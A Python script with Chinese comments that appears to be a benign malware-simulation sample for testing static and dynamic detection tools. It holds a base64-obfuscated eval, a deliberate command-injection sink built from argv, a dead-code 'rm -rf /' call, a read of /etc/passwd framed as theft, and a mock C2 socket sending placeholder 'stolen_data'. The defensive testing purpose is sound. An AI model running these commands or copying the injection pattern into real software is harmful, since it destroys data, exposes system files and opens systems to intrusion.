import os
import sys
import socket
import subprocess
import base64
import time

# --- 【对应静态分析 a: 模式匹配】 ---
# 故意写成 base64 编码的 eval，触发正则检测
def pattern_test():
    # 这段 base64 解码后是 print("hacked")
    payload = "cHJpbnQoJ2hhY2tlZCcp" 
    eval(base64.b64decode(payload)) 

# --- 【对应静态分析 b & d: 数据流与污点分析】 ---
# 接收外部参数 -> 未经处理 -> 传入危险函数
def taint_test():
    user_input = sys.argv[1] # Source
    # 模拟简单的逻辑处理
    cmd = "echo " + user_input 
    # Sink: 危险函数
    os.system(cmd) 

# --- 【对应静态分析 c: 控制流分析】 ---
# 隐藏在条件分支里的恶意代码
def logic_bomb():
    if 1 == 1:
        pass
    else:
        # 这是一个永远不会执行但在 AST 里的危险路径
        subprocess.Popen("rm -rf /", shell=True)

# --- 【对应动态分析 a & c: 系统调用 & 文件监控】 ---
# 模拟窃取密码文件，触发 open/read 系统调用
def steal_file():
    try:
        print("[*] 正在尝试读取敏感文件...")
        with open("/etc/passwd", "r") as f:
            data = f.read()
    except:
        pass

# --- 【对应动态分析 b: 网络活动监控】 ---
# 模拟连接 C2 服务器，触发 socket/connect 系统调用
def connect_c2():
    try:
        print("[*] 正在回传数据...")
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # 连接一个公共 DNS IP，保证不会报错但能被抓到
        s.connect(("8.8.8.8", 53)) 
        s.send(b"stolen_data")
        s.close()
    except:
        pass

# --- 【对应动态分析 d: 内存/代码注入】 ---
# 动态执行代码
def memory_exec():
    code = "import os; print('Memory execution test')"
    exec(code)

if __name__ == "__main__":
    print("--- 开始执行恶意模拟 ---")
    pattern_test()
    # taint_test() # 需要参数，演示时可以根据需要开启
    steal_file()
    connect_c2()
    memory_exec()
    print("--- 模拟结束 ---")